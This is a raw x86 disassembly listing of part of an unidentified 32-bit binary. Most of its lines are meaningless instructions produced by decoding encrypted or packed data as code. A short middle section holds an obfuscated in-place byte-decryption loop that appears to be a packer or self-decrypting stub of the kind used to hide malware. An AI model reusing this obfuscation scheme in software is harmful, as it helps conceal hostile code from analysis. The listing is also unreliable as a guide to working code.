  418942:	(bad)  
  418943:	jmp    0xe9ee3624
  418948:	loope  0x41890a
  41894a:	mov    bl,0xf1
  41894c:	call   0xeaf65b1d
  418951:	mov    edx,0xe1fae0d8
  418956:	add    cl,bh
  418958:	mov    ecx,0xe301f2
  41895d:	loopne 0x41893c
  41895f:	fadd   QWORD PTR [edx]
  418961:	adc    DWORD PTR [esi-0x4e0d3820],ebp
  418967:	retf   0xeec8
  41896a:	clc    
  41896b:	mov    ah,0xb6
  41896d:	cmc    
  41896e:	clc    
  41896f:	cmc    
  418970:	xlat   BYTE PTR ds:[ebx]
  418971:	stc    
  418972:	std    
  418973:	loopne 0x418964
  418975:	(bad)  
  418976:	in     al,dx
  418977:	cli    
  418978:	test   BYTE PTR [esi+esi*8],0x0
  41897c:	in     al,0x2
  41897e:	out    dx,al
  41897f:	add    BYTE PTR [eax],cl
  418981:	leave  
  418982:	jecxz  0x41894e
  418984:	xlat   BYTE PTR ds:[ebx]
  418985:	loope  0x41893e
  418987:	out    0xc8,eax
  418989:	(bad)  
  41898a:	retf   0xb6d1
  41898d:	retf   0xdcef
  418990:	rol    dl,cl
  418992:	mov    ebp,0xdbe2d1db
  418997:	cld    
  418998:	add    esp,esi
  41899a:	jmp    0xf508d66
  41899f:	hlt    
  4189a0:	into   
  4189a1:	push   es
  4189a2:	mov    esi,0xadd2c9ae
  4189a7:	int    0xd1
  4189a9:	repz enter 0xb4e7,0xda
  4189ae:	clc    
  4189af:	mov    dl,0xee
  4189b1:	into   
  4189b2:	call   0xdf4456b1
  4189b7:	or     edx,ecx
  4189b9:	loope  0x4189a2
  4189bb:	shl    ebp,0xc0
  4189be:	push   es
  4189bf:	add    eax,ecx
  4189c1:	fsub   st,st(5)
  4189c3:	test   eax,0xd03bc12b
  4189c8:	jne    0x418b19
  4189ce:	mov    eax,DWORD PTR [ebp-0x8]
  4189d1:	add    eax,DWORD PTR [ebp-0xd0]
  4189d7:	mov    al,BYTE PTR [eax]
  4189d9:	mov    BYTE PTR [ebp-0xf5],al
  4189df:	mov    eax,DWORD PTR [ebp-0xdc]
  4189e5:	xor    eax,0x75108b5
  4189ea:	add    eax,0x3272fb
  4189ef:	mov    DWORD PTR [ebp-0xfc],eax
  4189f5:	jmp    0x418a07
  4189fa:	mov    eax,DWORD PTR [ebp-0xfc]
  418a00:	inc    eax
  418a01:	mov    DWORD PTR [ebp-0xfc],eax
  418a07:	mov    eax,DWORD PTR [ebp-0xd8]
  418a0d:	xor    eax,0x75108b5
  418a12:	add    eax,0x3272fb
  418a17:	cmp    DWORD PTR [ebp-0xfc],eax
  418a1d:	jae    0x418aa4
  418a23:	mov    eax,DWORD PTR [ebp-0xfc]
  418a29:	sub    eax,0x3272fb
  418a2e:	xor    eax,0x75108b5
  418a33:	add    eax,0x7f55d8f2
  418a38:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a3e:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a45:	mov    eax,DWORD PTR [ebp-0xfc]
  418a4b:	cmp    DWORD PTR [ebp+eax*4-0xf4],0x244ecb9d
  418a56:	jbe    0x418a80
  418a5c:	mov    eax,DWORD PTR [ebp-0xfc]
  418a62:	mov    eax,DWORD PTR [ebp+eax*4-0xf4]
  418a69:	add    eax,0x405fcdc
  418a6e:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a74:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a7b:	jmp    0x418a9f
  418a80:	mov    eax,DWORD PTR [ebp-0xfc]
  418a86:	mov    eax,DWORD PTR [ebp+eax*4-0xf4]
  418a8d:	sub    eax,0x250bcdc
  418a92:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a98:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a9f:	jmp    0x4189fa
  418aa4:	xor    eax,eax
  418aa6:	inc    eax
  418aa7:	jne    0x418ac7
  418aad:	movzx  eax,BYTE PTR [ebp-0xf5]
  418ab4:	xor    eax,0x83
  418ab9:	add    eax,0x8
  418abc:	mov    BYTE PTR [ebp-0xf5],al
  418ac2:	jmp    0x418b06
  418ac7:	mov    eax,DWORD PTR [ebp-0xd4]
  418acd:	xor    eax,0x75108b5
  418ad2:	add    eax,0x3272fb
  418ad7:	movzx  ecx,BYTE PTR [ebp-0xf5]
  418ade:	sub    ecx,eax
  418ae0:	mov    BYTE PTR [ebp-0xf5],cl
  418ae6:	mov    ecx,DWORD PTR [ebp-0xcc]
  418aec:	xor    ecx,0x75108b5
  418af2:	add    ecx,0x3272fb
  418af8:	mov    al,BYTE PTR [ebp-0xf5]
  418afe:	ror    al,cl
  418b00:	mov    BYTE PTR [ebp-0xf5],al
  418b06:	xor    eax,eax
  418b08:	mov    eax,DWORD PTR [ebp-0x8]
  418b0b:	add    eax,DWORD PTR [ebp-0xd0]
  418b11:	mov    cl,BYTE PTR [ebp-0xf5]
  418b17:	mov    BYTE PTR [eax],cl
  418b19:	mov    eax,DWORD PTR [ebp-0xd0]
  418b1f:	sub    eax,0x3272fb
  418b24:	xor    eax,0x75108b5
  418b29:	cmp    eax,DWORD PTR [ebp-0xdc]
  418b2f:	jne    0x418b8c
  418b35:	mov    eax,DWORD PTR [ebp-0xc8]
  418b3b:	xor    eax,0x75108b5
  418b40:	add    eax,0x3272fb
  418b45:	mov    ecx,DWORD PTR [ebp-0xe0]
  418b4b:	xor    ecx,0x75108b5
  418b51:	add    ecx,0x3272fb
  418b57:	sub    eax,ecx
  418b59:	sub    eax,0x3272fb
  418b5e:	xor    eax,0x75108b5
  418b63:	mov    DWORD PTR [ebp-0xc8],eax
  418b69:	mov    eax,DWORD PTR [ebp-0xe0]
  418b6f:	xor    eax,0x75108b5
  418b74:	add    eax,0x3272fb
  418b79:	mov    ecx,DWORD PTR [ebp-0x100]
  418b7f:	sub    ecx,eax
  418b81:	mov    DWORD PTR [ebp-0xd0],ecx
  418b87:	jmp    0x418baa
  418b8c:	mov    eax,DWORD PTR [ebp-0xe0]
  418b92:	xor    eax,0x75108b5
  418b97:	add    eax,0x3272fb
  418b9c:	mov    ecx,DWORD PTR [ebp-0xd0]
  418ba2:	sub    ecx,eax
  418ba4:	mov    DWORD PTR [ebp-0xd0],ecx
  418baa:	jmp    0x416531
  418baf:	mov    DWORD PTR [ebp-0x7c],0xe
  418bb6:	jmp    0x418bc2
  418bbb:	mov    eax,DWORD PTR [ebp-0x7c]
  418bbe:	dec    eax
  418bbf:	mov    DWORD PTR [ebp-0x7c],eax
  418bc2:	cmp    DWORD PTR [ebp-0x7c],0x0
  418bc6:	jbe    0x42b043
  418bcc:	mov    eax,DWORD PTR [ebp-0x7c]
  418bcf:	dec    eax
  418bd0:	xor    edx,edx
  418bd2:	push   0x2
  418bd4:	pop    ecx
  418bd5:	div    ecx
  418bd7:	mov    DWORD PTR [ebp-0x140],edx
  418bdd:	mov    eax,DWORD PTR [ebp-0x2c]
  418be0:	mov    DWORD PTR [ebp-0x13c],eax
  418be6:	mov    DWORD PTR [ebp-0x110],0xf89c8527
  418bf0:	mov    DWORD PTR [ebp-0x108],0xf89c85bd
  418bfa:	mov    DWORD PTR [ebp-0x118],0xf89c85b0
  418c04:	mov    DWORD PTR [ebp-0x11c],0xf89c85b3
  418c0e:	mov    DWORD PTR [ebp-0x104],0xf89c85b2
  418c18:	mov    eax,DWORD PTR [ebp-0x11c]
  418c1e:	xor    eax,0x75108b5
  418c23:	jmp    0x41afc9
  418c28:	adc    BYTE PTR [eax],0xb6
  418c2b:	push   ebp
  418c2c:	xor    al,0x75
  418c2e:	pusha  
  418c2f:	push   esp
  418c30:	dec    edx
  418c31:	repz jae 0x418c1c
  418c34:	test   eax,0x390f74bb
  418c39:	mov    dh,0x7a
  418c3b:	jnp    0x418c3f
  418c3d:	cwde   
  418c3e:	jnp    0x418cbb
  418c40:	test   al,0xef
  418c42:	rol    bl,1
  418c44:	into   
  418c45:	aam    0xfa
  418c47:	aam    0xe7
  418c49:	retf   
  418c4a:	mov    ah,0xd6
  418c4c:	cld    
  418c4d:	enter  0xefce,0xda
  418c51:	add    cl,ah
  418c53:	fdivrp st(6),st
  418c55:	fcomi  st,st(7)
  418c57:	add    cl,cl
  418c59:	fcmove st,st(1)
  418c5b:	stc    
  418c5c:	repz loopne 0x418c0d
  418c5f:	mov    ebp,0xf7c9c3c3
  418c64:	sti    
  418c65:	(bad)  
  418c66:	mov    edx,0xc4e9d1eb
  418c6b:	cld    
  418c6c:	test   esp,0xbe02f6f1
  418c72:	mul    ecx
  418c74:	sar    ch,cl
  418c76:	hlt    
  418c77:	dec    bh
  418c79:	add    eax,edi
  418c7b:	fxam   
  418c7d:	enter  0xd0a9,0xb1
  418c81:	in     eax,0xf3
  418c83:	loop   0x418c78
  418c85:	cmc    
  418c86:	stc    
  418c87:	fsubr  st,st(6)
  418c89:	jmp    0xedbe:0xe1cbf8e4
  418c90:	push   edx
  418c92:	ret    0xfbfd
  418c95:	mov    BYTE PTR [edi+ebx*8],0xdb
  418c99:	jecxz  0x418c73
  418c9b:	in     al,dx
  418c9c:	fcomp  st(1)
  418c9e:	into   
  418c9f:	in     al,dx
  418ca0:	xlat   BYTE PTR ds:[ebx]
  418ca1:	ret    0xbcb0
  418ca4:	lods   al,BYTE PTR ds:[esi]
  418ca5:	test   al,0xf9
  418ca7:	jmp    0xfff0:0xfbdbb0d1
  418cae:	enter  0xf9c3,0xcd
  418cb2:	pop    es
  418cb3:	in     al,0xf0
  418cb5:	fcomip st,st(0)
  418cb7:	in     al,0xca
  418cb9:	in     eax,0xc5
  418cbb:	loop   0x418c8a
  418cbd:	(bad)  
  418cbe:	repz into 
  418cc0:	jmp    0x418c71
  418cc2:	mov    al,0xc9
  418cc4:	mov    ebx,0xdff9aff1
  418cc9:	idiv   edi
  418ccb:	mov    esp,0xd6c1b0bd
  418cd0:	repz rol eax,cl
  418cd3:	ret    
  418cd4:	rol    ch,cl
  418cd6:	mov    BYTE PTR [ecx],0xff
  418cd9:	pmaddwd mm1,mm5
  418cdc:	fdivr  st(3),st
  418cde:	rcr    ch,cl
  418ce0:	ret    
  418ce1:	(bad)  
  418ce2:	ror    esi,0xce
  418ce5:	loop   0x418cb1
  418ce7:	in     al,0xda
  418ce9:	ror    ch,cl
  418ceb:	div    esi
  418ced:	ret    
  418cee:	ret    
  418cef:	rol    BYTE PTR [ebx],1
  418cf1:	fdivr  st,st(6)
  418cf3:	add    eax,0xc4fdd9d8
  418cf8:	paddusb mm2,mm4
  418cfb:	pmulhw mm1,QWORD PTR [edi]
  418cfe:	out    0xcb,eax
  418d00:	out    0xc3,al
  418d02:	lods   al,BYTE PTR ds:[esi]
  418d03:	lods   al,BYTE PTR ds:[esi]
  418d04:	retf   
  418d05:	sti    
  418d06:	test   ebx,0xdbcbfedf
  418d0c:	(bad)  
  418d0d:	loope  0x418cdf
  418d0f:	out    dx,eax
  418d10:	mov    ebp,0xfbe0f3c2
  418d15:	or     eax,DWORD PTR ds:0xce0ac0e6
  418d1b:	add    al,0x7
  418d1d:	add    al,0xa8
  418d1f:	neg    esi
  418d21:	fadd   st(5),st
  418d23:	(bad)  
  418d24:	repnz ror bl,1
  418d27:	cmc    
  418d28:	xlat   BYTE PTR ds:[ebx]
  418d29:	sar    BYTE PTR [esi-0xefc281d],1
  418d2f:	not    bl
  418d31:	div    ah
  418d33:	repz fcomip st,st(6)
  418d36:	icebp  
  418d37:	jmp    0x10c702b
  418d3c:	cli    
  418d3d:	retf   0xc3e3
  418d40:	into   
  418d41:	loope  0x418d0e
  418d43:	retf   
  418d44:	retf   0xb2ee
  418d47:	retf   
  418d48:	aad    0xc4
  418d4a:	les    edi,FWORD PTR [ecx-0xf202527]
  418d50:	std    
  418d51:	lock (bad) 
  418d54:	fcmovbe st,st(1)
  418d56:	or     esp,esi
  418d58:	or     ebx,ebp
  418d5a:	(bad)  
  418d5d:	repnz rcr al,cl
  418d60:	mov    ebp,0xe9b2dde8
  418d65:	not    esi
  418d67:	(bad)  
  418d68:	mov    ebx,0xd5faf8b5
  418d6d:	fild   WORD PTR [ecx]
  418d6f:	ret    0xd1dc
  418d72:	add    eax,0xe503d0f1
  418d77:	(bad)  
  418d78:	loope  0x418d45
  418d7a:	jecxz  0x418d61
  418d7c:	fimul  WORD PTR [edi]
  418d7e:	rcr    al,cl
  418d80:	int3   
  418d81:	iret   
  418d82:	aam    0xd3
  418d84:	out    dx,al
  418d85:	enter  0xefaf,0xf6
  418d89:	stc    
  418d8a:	(bad)  
  418d8c:	fnstsw WORD PTR [edi+esi*8-0xa2c3138]
  418d93:	hlt    
  418d94:	fmul   st,st(2)
  418d96:	jmp    0x418d58
  418d98:	stc    
  418d99:	in     al,0xc8
  418d9b:	enter  0xf2ff,0xc8
  418d9f:	ret    
  418da0:	mov    ch,0xd3
  418da3:	shl    ah,1
  418da5:	mov    ch,0xd8
  418da7:	fdivr  st,st(7)
  418da9:	(bad)  
  418daa:	mov    eax,0xd7bfdbb6
  418daf:	add    dl,bl
  418db1:	pop    es
  418db2:	mov    esp,0xfb0bf7d0
  418db7:	out    dx,eax
  418db8:	fstp   st(3)
  418dba:	(bad)  
  418dbc:	adc    bl,ah
  418dbe:	iret   
  418dbf:	mov    ebp,0xc9f7cdc1
  418dc4:	jmp    0x418d90
  418dc6:	enter  0xe6d4,0xd9
  418dca:	repz cld 
  418dcc:	lock mov esi,0xe7f3e0ee
  418dd2:	cli    
  418dd3:	or     edx,edx
  418dd5:	fadd   st(4),st
  418dd7:	(bad)  
  418dd8:	clc    
  418dd9:	add    eax,0xeb0b00f5
  418dde:	enter  0xefca,0xe7
  418de2:	retf   0xa9d1
  418de5:	mov    ah,0xe1
  418de7:	repnz jmp 0xf6c3:0xdfd6bff0
  418def:	out    dx,eax
  418df0:	hlt    
  418df1:	ret    
  418df2:	jecxz  0x418dfb
  418df4:	or     ah,bh
  418df6:	jmp    0x418dd0
  418df8:	leave  
  418df9:	into   
  418dfa:	loopne 0x418ddc
  418dfc:	in     al,0x5
  418dfe:	retf   
  418dff:	fcom   st(1)
  418e01:	not    edi
  418e03:	jecxz  0x418dee
  418e05:	idiv   DWORD PTR [ecx-0x252a1752]
  418e0b:	iret   
  418e0c:	repnz jmp 0xd200:0xe6fef3f4
  418e14:	aad    0xe5
  418e16:	shl    eax,0xe7
  418e19:	out    dx,al
  418e1a:	jecxz  0x418deb
  418e1c:	fstp   st(0)
  418e1e:	test   al,0xd0
  418e20:	shr    ebp,0xf4
  418e23:	out    0xc1,al
  418e25:	mov    edi,0xcbfeb5c9
  418e2b:	(bad)  
  418e2c:	call   0xe43d4b26
  418e31:	out    0xfd,al
  418e33:	shl    al,1
  418e35:	lock ret 
  418e37:	mov    esi,0xe2f9e203
  418e3c:	out    0x0,eax
  418e3e:	scas   al,BYTE PTR es:[edi]
  418e3f:	scas   al,BYTE PTR es:[edi]
  418e40:	into   
  418e41:	int3   
  418e42:	(bad)  
  418e43:	mov    bl,0xd4
  418e45:	ret    0xaeee
  418e48:	(bad)  
  418e49:	int    0xca
  418e4b:	aad    0xf8
  418e4d:	hlt    
  418e4e:	mov    esi,0xc6c2d1f7
  418e53:	loopne 0x418e15
  418e55:	add    edx,ebp
  418e57:	fmul   QWORD PTR [ebx]
  418e59:	(bad)  
  418e5a:	stc    
  418e5b:	in     eax,dx
  418e5c:	int3   
  418e5d:	out    dx,al
  418e5e:	mov    ebp,0xb6edb3ee
  418e63:	(bad)  
  418e64:	mov    ch,0xd0
  418e66:	retf   
  418e67:	fmul   st,st(3)
  418e69:	out    0xbb,al
  418e6b:	ror    edi,1
  418e6d:	in     al,dx
  418e6e:	(bad)  
  418e70:	add    ch,dh
  418e72:	inc    al
  418e74:	jmp    esi
  418e76:	ret    0xc6c2
  418e79:	pop    es
  418e7a:	hlt    
  418e7b:	or     al,BYTE PTR [edi]
  418e7d:	fmulp  st(7),st
  418e7f:	loop   0x418e42
  418e81:	xlat   BYTE PTR ds:[ebx]
  418e82:	mov    ebp,0xc5c2d3c7
  418e87:	(bad)  
  418e88:	mov    ah,0xc6
  418e8a:	stc    
  418e8b:	mov    ebp,0xddcc02cd
  418e90:	add    ah,cl
  418e92:	add    dl,dl
  418e94:	rol    ebx,cl
  418e96:	loopne 0x418e58
  418e98:	sti    
  418e99:	jmp    0x13b7e99
  418e9e:	ret    0xc3e2
  418ea1:	test   ah,0xe7
  418ea4:	mov    dl,0xb2
  418ea6:	in     eax,dx
  418ea7:	(bad)  
  418ea8:	mov    bh,0xf9
  418eaa:	fdivp  st(6),st
  418eac:	fcmovbe st,st(3)
  418eae:	mov    esi,0xc2e5d1d8
  418eb3:	(bad)  
  418eb4:	jmp    0x418e81
  418eb6:	leave  
  418eb7:	(bad)  
  418eb8:	loopne 0x418e9a
  418eba:	retf   
  418ebb:	repz or edi,ebx
  418ebe:	enter  0xbef2,0xc6
  418ec2:	jmp    0x418eb2
  418ec4:	out    dx,al
  418ec5:	iret   
  418ec6:	(bad)  
  418ec7:	cli    
  418ec8:	out    0xe5,eax
  418eca:	jmp    0xfe376687
  418ecf:	shl    ebx,0xbf
  418ed2:	int    0xbc
  418ed4:	loop   0x418ea6
  418ed6:	pop    es
  418ed7:	(bad)
  418eda:	push   es
  418edb:	loopne 0x418ea7
  418edd:	(bad)  
  418edf:	out    0xc5,eax
  418ee1:	(bad)  
  418ee2:	loopne 0x418ea4
  418ee4:	out    dx,eax
  418ee5:	jmp    0xefc4:0xbfcec8ec
  418eec:	fsubr  st,st(0)
  418eee:	shl    ecx,0xd4
  418ef1:	cli    
  418ef2:	mov    esp,0xc1da07c0
  418ef7:	fucomp st(6)
  418ef9:	jmp    0x70c70e3
  418efe:	test   al,0xf1
  418f00:	repz aad 0xcc
  418f03:	rcr    bl,0xee
  418f06:	aam    0xcb
  418f08:	mov    ecx,0xebdedbd2
  418f0d:	mov    edx,0xc6efb9ef
  418f12:	(bad)  
  418f14:	rcr    esi,cl
  418f16:	aam    0xb
  418f18:	fadd   DWORD PTR [eax]
  418f1a:	push   es
  418f1b:	int    0xc8
  418f1d:	leave  
  418f1e:	(bad)  
  418f1f:	scas   al,BYTE PTR es:[edi]
  418f20:	out    0xd6,al
  418f22:	leave  
  418f23:	(bad)  
  418f25:	fnstenv [edi-0x49251319]
  418f2b:	jecxz  0x418f00
  418f2d:	idiv   edx
  418f2f:	ret    0xbfbf
  418f32:	add    ch,bh
  418f34:	hlt    
  418f35:	(bad)
  418f38:	ror    BYTE PTR [esi],0x7
  418f3b:	fcmovne st,st(6)
  418f3d:	in     al,0xbf
  418f3f:	stos   BYTE PTR es:[edi],al
  418f40:	out    dx,al
  418f41:	ret    
  418f42:	out    dx,al
  418f43:	shl    BYTE PTR [ebp-0x944330b],0xfe
  418f4a:	clc    
  418f4b:	in     eax,dx
  418f4c:	not    dh
  418f4e:	cmc    
  418f4f:	out    0x6,eax
  418f51:	(bad)  
  418f53:	add    eax,0xc5d4e7f8
  418f58:	or     ecx,ebp
  418f5a:	fiadd  DWORD PTR [eax]
  418f5c:	loopne 0x418f71
  418f5e:	retf   0xb0c5
  418f61:	mov    esi,0xc5c2f4fb
  418f67:	mov    dh,0xd1
  418f69:	mov    ah,0xe8
  418f6b:	retf   0xf7d1
  418f6e:	(bad)  
  418f70:	mov    edi,0xdcff02e5
  418f75:	add    dl,ch
  418f77:	(bad)  
  418f78:	mov    BYTE PTR [eax],0xdd
  418f7b:	push   cs
  418f7c:	or     edx,edi
  418f7e:	in     eax,dx
  418f7f:	lods   al,BYTE PTR ds:[esi]
  418f80:	loopne 0x418f6a
  418f82:	repnz lock cli 
  418f85:	retf   0xd6d2
  418f88:	vpsubq ymm7,ymm5,YMMWORD PTR [ebx+ecx*8-0x203c3111]
  418f91:	shl    ecx,0xf9
  418f94:	out    0xdd,eax
  418f96:	(bad)  
  418f98:	jmp    0xef3f7591
  418f9d:	into   
  418f9e:	enter  0xc5d8,0xe8
  418fa2:	lock loop 0x418f91
  418fa5:	out    0xc5,eax
  418fa7:	repnz clc 
  418fa9:	(bad)  
  418faa:	out    dx,al
  418fab:	out    dx,al
  418fac:	out    dx,al
  418fad:	iret   
  418fae:	rol    BYTE PTR [edx],1
  418fb0:	xlat   BYTE PTR ds:[ebx]
  418fb1:	out    0xc7,eax
  418fb3:	mov    esp,0xcbfdfdf3
  418fb8:	shl    esi,0xe0
  418fbb:	int    0xee
  418fbd:	fdivr  st(0),st
  418fbf:	(bad)  
  418fc0:	shr    BYTE PTR [esi-0x3d2f0a13],1
  418fc6:	aam    0xc6
  418fc8:	(bad)  
  418fc9:	mov    bh,0xba
  418fcb:	rcr    esi,cl
  418fcd:	cli    
  418fce:	lock out dx,eax
  418fd0:	push   es
  418fd1:	shr    ebp,0xe6
  418fd4:	aad    0xc6
  418fd6:	jmp    0x418fbf
  418fd8:	clc    
  418fd9:	jmp    0x418fc4
  418fdb:	adc    eax,DWORD PTR [edi]
  418fdd:	(bad)  
  418fdf:	rcr    ch,0xf5
  418fe2:	int3   
  418fe3:	xlat   BYTE PTR ds:[ebx]
  418fe4:	(bad)  
  418fe6:	(bad)  
  418fe7:	mov    al,0xcc
  418fe9:	sar    bl,1
  418feb:	fnstcw WORD PTR [ecx+ebp*8-0x2b3e0849]
  418ff2:	jecxz  0x418fe6
  418ff4:	std    
  418ff5:	stc    
  418ff6:	(bad)  
  418ff8:	(bad)  
  418ff9:	add    al,0xa
  418ffb:	fild   DWORD PTR [esi]
  418ffd:	stc    
  418ffe:	jmp    0x418fe5
  419000:	loopne 0x418fc6
  419002:	repz hlt 
  419004:	loope  0x418fbd
  419006:	mov    edx,0xdcc5f2f2
  41900b:	retf   
  41900c:	int3   
  41900d:	shl    cl,cl
  41900f:	mov    edi,0xdadfb4de
  419014:	lock xlat BYTE PTR ds:[ebx]
  419016:	ret    
  419017:	aam    0xde
  419019:	aad    0xe1
  41901b:	out    0xc,al
  41901d:	or     ch,dl
  41901f:	fsub   st,st(2)
  419021:	repz hlt 
  419023:	ret    
  419024:	out    0xd1,eax
  419026:	in     al,dx
  419027:	out    dx,al
  419028:	mov    edi,0xc3b5f6f5
  41902d:	ret    
  41902e:	loope  0x41901e
  419030:	shl    eax,cl
  419032:	ret    
  419033:	loope  0x418ff5
  419035:	fstp   st(5)
  419037:	loopne 0x419014
  419039:	(bad)  
  41903a:	int    0xb
  41903c:	or     al,BYTE PTR [eax]
  41903e:	mov    bl,0xc4
  419040:	mov    bl,0xc9
  419042:	aad    0xf1
  419044:	in     eax,dx
  419045:	(bad)  
  419046:	loopne 0x419008
  419048:	int    0xe5
  41904a:	retf   0xdbb4
  41904d:	(bad)  
  41904e:	fcom   st(1)
  419050:	out    0xf6,al
  419052:	fcmovnb st,st(5)
  419054:	add    ebx,ebp
  419056:	shr    cl,0xd5
  419059:	add    al,0xc
  41905b:	in     al,dx
  41905c:	add    DWORD PTR [edx],edx
  41905e:	mov    esi,0xc1e5e5e3
  419063:	retf   0xf1b3
  419066:	hlt    
  419067:	aad    0xbf
  419069:	aam    0xfa
  41906b:	lock int 0xdc
  41906e:	rol    BYTE PTR [edx],cl
  419070:	mov    eax,0xf7c7fff8
  419075:	neg    ebp
  419077:	ffreep st(6)
  419079:	inc    edi
  41907b:	out    dx,al
  41907c:	shl    edx,cl
  41907e:	mov    esi,0xcad1efe8
  419083:	lds    edi,FWORD PTR [ebx-0x170f1e17]
  419089:	lods   al,BYTE PTR ds:[esi]
  41908a:	mov    ebx,0xf5bce9fd
  41908f:	hlt    
  419090:	out    dx,eax
  419091:	aam    0xf3
  419093:	jmp    0x419086
  419095:	add    ecx,eax
  419097:	fcomi  st,st(4)
  419099:	retf   0xd9d9
  41909c:	add    ecx,esi
  41909e:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190a0:	enter  0xb7ee,0xf6
  4190a4:	lods   eax,DWORD PTR ds:[esi]
  4190a5:	rcr    edx,0xf8
  4190a8:	(bad)  
  4190a9:	fxch   st(0)
  4190ab:	mov    dl,0xfd
  4190ad:	aad    0xbd
  4190af:	mov    edx,0xfee4d5de
  4190b4:	sar    bh,0xff
  4190b7:	add    al,bl
  4190b9:	fcmove st,st(5)
  4190bb:	fld    DWORD PTR [edi]
  4190bd:	out    dx,eax
  4190be:	call   0xe42374b3
  4190c3:	jmp    0xcd1586b3
  4190c8:	call   0xbc014bb2
  4190cd:	cli    
  4190ce:	test   DWORD PTR [ecx],0xf0d70101
  4190d4:	cmc    
  4190d5:	cmc    
  4190d6:	clc    
  4190d7:	lock div ah
  4190da:	in     eax,dx
  4190db:	leave  
  4190dc:	jecxz  0x4190dd
  4190de:	iret   
  4190df:	int    0xf6
  4190e1:	scas   al,BYTE PTR es:[edi]
  4190e2:	shl    edx,0xe6
  4190e5:	mov    ebx,0xfdd9dbed
  4190ea:	retf   0xf9f6
  4190ed:	aad    0xe3
  4190ef:	mov    ecx,0xd505dfc3
  4190f4:	stc    
  4190f5:	sti    
  4190f6:	hlt    
  4190f7:	add    eax,0xebfd01c7
  4190fc:	leave  
  4190fd:	or     eax,0xc6d7aae7
  419102:	mov    ch,0xb0
  419104:	leave  
  419105:	out    0xc8,eax
  419107:	(bad)  
  419109:	lock aad 0xfd
  41910c:	mov    cl,0xe9
  41910e:	aad    0xf5
  419110:	jecxz  0x4190f4
  419112:	cld    
  419113:	jecxz  0x419117
  419115:	fdivr  st,st(6)
  419117:	std    
  419118:	or     ecx,ebx
  41911a:	out    0xc9,al
  41911c:	jmp    0xc6015430
  419121:	loopne 0x4190e8
  419123:	mov    dh,0xd3
  419125:	aad    0xd3
  419127:	sar    DWORD PTR [ebx-0x9492b25],cl
  41912d:	fdivr  st,st(1)
  41912f:	neg    eax
  419131:	bnd ret 
  419133:	lds    ecx,FWORD PTR [edx]
  419135:	or     al,BYTE PTR [esi]
  419137:	loop   0x419121
  419139:	clc    
  41913a:	jecxz  0x41914b
  41913c:	enter  0xf0ff,0xbc
  419140:	(bad)
  419143:	mov    al,0xb2
  419145:	idiv   DWORD PTR [edx-0x92d121b]
  41914b:	in     al,0xf4
  41914d:	std    
  41914e:	loope  0x419120
  419150:	into   
  419151:	in     eax,0xdc
  419153:	or     edx,esp
  419155:	std    
  419156:	rcr    cl,1
  419158:	or     ebx,ecx
  41915a:	(bad)  
  41915b:	sti    
  41915c:	cli    
  41915d:	fdivr  QWORD PTR [esi-0x290a2e13]
  419163:	icebp  
  419164:	out    0xfb,al
  419166:	lock fnstcw WORD PTR [ecx-0x451b1042]
  41916d:	fsubr  st,st(4)
  41916f:	mov    esi,0xc7f2d4d8
  419174:	mov    ebp,0xc6e8d8e5
  419179:	stc    
  41917a:	(bad)  
  41917b:	clc    
  41917c:	jecxz  0x41914d
  41917e:	leave  
  41917f:	shl    cl,0xc2
  419182:	(bad)
  419185:	jmp    0xf314875a
  41918a:	(bad)
  41918d:	cld    
  41918e:	(bad)  
  419190:	xlat   BYTE PTR ds:[ebx]
  419191:	pop    es
  419192:	push   es
  419193:	mov    esi,0xdadbf8f9
  419198:	std    
  419199:	leave  
  41919a:	out    0xe2,eax
  41919c:	sar    ebp,cl
  41919e:	ror    ebp,cl
  4191a0:	shl    dh,1
  4191a2:	(bad)  [edi+ebp*8-0x54b252d]
  4191a9:	clc    
  4191aa:	idiv   ch
  4191ac:	stc    
  4191ad:	in     eax,dx
  4191ae:	mov    edx,0xdcedcfd4
  4191b3:	in     al,dx
  4191b4:	mov    ecx,0xdcdac109
  4191b9:	paddw  mm0,QWORD PTR [ebx]
  4191bc:	fmulp  st(3),st
  4191be:	loop   0x4191a4
  4191c0:	lock (bad) 
  4191c2:	fucomp st(2)
  4191c4:	mov    al,0xe7
  4191c6:	in     eax,dx
  4191c7:	enter  0xecb5,0xcc
  4191cb:	mov    eax,0xdbc2e3d1
  4191d0:	mov    eax,0xd4d7e5d3
  4191d5:	fsubr  st(5),st
  4191d7:	add    edi,edi
  4191d9:	into   
  4191da:	(bad)  
  4191db:	in     al,0xfc
  4191dd:	fsub   st(7),st
  4191df:	enter  0xa8df,0xe8
  4191e3:	retf   0xe8ad
  4191e6:	rol    esp,1
  4191e8:	in     eax,0xea
  4191ea:	repz mov ebp,0xb6b8c3be
  4191f0:	repz fdiv st,st(3)
  4191f3:	add    dh,ah
  4191f5:	fsub   st,st(7)
  4191f7:	or     al,ch
  4191f9:	push   cs
  4191fa:	into   
  4191fb:	or     eax,0xc9d0e7e0
  419200:	rcl    bh,1
  419202:	shl    DWORD PTR [ebp-0x26052420],cl
  419208:	repz iret 
  41920a:	(bad)  
  41920c:	fadd   st(2),st
  41920e:	out    dx,al
  41920f:	pop    es
  419210:	jecxz  0x419200
  419212:	cli    
  419213:	in     al,dx
  419214:	or     cl,BYTE PTR [edx]
  419216:	aam    0xb
  419218:	fdivr  st,st(3)
  41921a:	or     ah,cl
  41921c:	push   es
  41921d:	fcomip st,st(3)
  41921f:	in     al,dx
  419220:	call   0xaa2d5601
  419225:	fucomi st,st(5)
  419227:	repz mov ebx,0xf1efefd9
  41922d:	in     al,dx
  41922e:	loopne 0x4191f8
  419230:	(bad)  
  419232:	int3   
  419233:	inc    edi
  419235:	std    
  419236:	(bad)  
  419238:	mov    BYTE PTR [esi],0xdc
  41923b:	or     esp,edx
  41923d:	leave  
  41923e:	lods   al,BYTE PTR ds:[esi]
  41923f:	(bad)  
  419240:	in     eax,0xca
  419242:	xlat   BYTE PTR ds:[ebx]
  419243:	(bad)  
  419244:	jmp    0xf5f853fd
  419249:	mov    ch,0xca
  41924b:	iret   
  41924c:	(bad)  
  41924d:	mov    al,0x2
  41924f:	(bad)  
  419250:	neg    ah
  419252:	icebp  
  419253:	add    ah,dl
  419255:	(bad)  
  419256:	xlat   BYTE PTR ds:[ebx]
